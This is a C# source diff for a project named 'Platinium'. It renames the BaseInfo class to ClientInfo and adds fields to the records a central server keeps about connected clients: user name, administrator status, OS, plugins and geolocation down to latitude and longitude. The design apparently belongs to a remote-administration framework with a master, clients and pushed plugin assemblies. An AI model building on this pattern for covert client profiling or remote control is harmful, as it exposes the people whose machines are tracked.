@@ -27,7 +27,7 @@ namespace Platinium
     {
         namespace Core
         {
-            public class Converter
+            public partial class Converter
             {
                 public static Dictionary<string, object> ClassToDictionary(object objectToConvert)
                 {
@@ -108,7 +108,7 @@ namespace Platinium
             {
                 public string Name { get; set; }
             }
-            public class PluginFactory
+            public partial class PluginFactory
             {
                 public static Package HandlePluginMethods(Package inPackage, BaseInfoType baseInfoType)
                 {
@@ -180,7 +180,7 @@ namespace Platinium
                     }
                     public static Package HandleClientPackages(Package inPackage)
                     {
-                        Package returnPackage = new Package(null, null, PackageType.Response, new BaseInfo(BaseInfoType.Server), inPackage.To);
+                        Package returnPackage = new Package(null, null, PackageType.Response, new ClientInfo(BaseInfoType.Server), inPackage.To);
                         switch (inPackage.PackageType)
                         {
                             case PackageType.Base:
@@ -241,7 +241,7 @@ namespace Platinium
                     }
                     public static Package HandleMasterPackages(Package inPackage)
                     {
-                        Package returnPackage = new Package(null, null, PackageType.Response, new BaseInfo(BaseInfoType.Server), inPackage.To);
+                        Package returnPackage = new Package(null, null, PackageType.Response, new ClientInfo(BaseInfoType.Server), inPackage.To);
                         switch (inPackage.PackageType)
                         {
                             case PackageType.Base:
@@ -305,12 +305,12 @@ namespace Platinium
                 [Serializable]
                 public class Package
                 {
-                    public BaseInfo To { get; private set; }
-                    public BaseInfo From { get; private set; }
+                    public ClientInfo To { get; private set; }
+                    public ClientInfo From { get; private set; }
                     public string Command { get; private set; }
                     public object Content { get; private set; }
                     public PackageType PackageType { get; private set; }
-                    public Package(string command, object obj, PackageType packagetype, BaseInfo to, BaseInfo from)
+                    public Package(string command, object obj, PackageType packagetype, ClientInfo to, ClientInfo from)
                     {
                         Command = command;
                         To = to;
@@ -318,7 +318,7 @@ namespace Platinium
                         From = from;
                         Content = obj;
                     }
-                    public Package(string command, object obj, PackageType packagetype, BaseInfo from)
+                    public Package(string command, object obj, PackageType packagetype, ClientInfo from)
                     {
                         Command = command;
                         From = from;
@@ -406,8 +406,8 @@ namespace Platinium
                 [Serializable]
                 public static class DataStructure
                 {
-                    public static List<BaseInfo> MasterList = new List<BaseInfo>();
-                    public static List<BaseInfo> ClientList = new List<BaseInfo>();
+                    public static List<ClientInfo> MasterList = new List<ClientInfo>();
+                    public static List<ClientInfo> ClientList = new List<ClientInfo>();
                     public static Dictionary<Metadata, IPlugin> PluginDictionary = new Dictionary<Metadata, IPlugin>();
                     public static Dictionary<Metadata, MethodInfo[]> PluginMethodDictionary = new Dictionary<Metadata, MethodInfo[]>();
                     public static List<byte[]> AssemblyList = new List<byte[]>();
@@ -417,45 +417,54 @@ namespace Platinium
         }
         namespace Info
         {
+            public class LocationInfo
+            {
+                public string City { get; set; }
+                public string Country { get; set; }
+                public float Latitude { get; set; }
+                public float Longitude { get; set; }
+                public string Region { get; set; }
+                public int TimeZone { get; set; }
+                public string ZipCode { get; set; }
+            }
             public enum BaseInfoType
             {
                 Client,
                 Master,
                 Server
             }
-            public interface IInfo : IEnumerable<object>
-            {
-                string Name { get; set; }
-                string IP { get; set; }
-                string MACAddress { get; set; }
-                string UID { get; set; }
-                BaseInfoType Type { get; set; }
-                Connector Connector { get; set; }
-            }
             [Serializable]
-            public class BaseInfo : IInfo
+            public class ClientInfo : IEnumerable<object>
             {
                 public string IP { get; set; }
                 public string MACAddress { get; set; }
-                public string Name { get; set; }
+                public string UserName { get; set; }
                 public string UID { get; set; }
+                public string Language { get; set; }
+                public bool IsAdministrator { get; set; }
+                public LocationInfo Location { get; set; }
+                public string OSName { get; set; }
+                public short AppVersion { get; set; }
+                public string FrameworkVersion { get; set; }
+                public List<Metadata> Plugins { get; set; }
+
                 public BaseInfoType Type { get; set; }
                 public Connector Connector { get; set; }
-                public BaseInfo()
+                public ClientInfo()
                 {
 
                 }
-                public BaseInfo(string uid, BaseInfoType type)
+                public ClientInfo(string uid, BaseInfoType type)
                 {
                     UID = uid;
                     Type = type;
                 }
-                public BaseInfo(string uid)
+                public ClientInfo(string uid)
                 {
                     UID = uid;
                     Type = BaseInfoType.Client;
                 }
-                public BaseInfo(BaseInfoType type)
+                public ClientInfo(BaseInfoType type)
                 {
                     Type = type;
                 }
@@ -463,8 +472,22 @@ namespace Platinium
                 {
                     yield return IP;
                     yield return MACAddress;
-                    yield return Name;
+                    yield return UserName;
+                    yield return OSName;
+                    yield return AppVersion;
+                    yield return FrameworkVersion;
+                    yield return IsAdministrator;
                     yield return UID;
+                    yield return Language;
+                    yield return Location.City;
+                    yield return Location.ZipCode;
+                    yield return Location.Country;
+                    yield return Location.Region;
+                    yield return Location.TimeZone;
+                    yield return Location.Latitude;
+                    yield return Location.Longitude;
+                    yield return Type;
+                    yield return Plugins;
                 }
                 public IEnumerator<object> GetEnumerator()
                 {
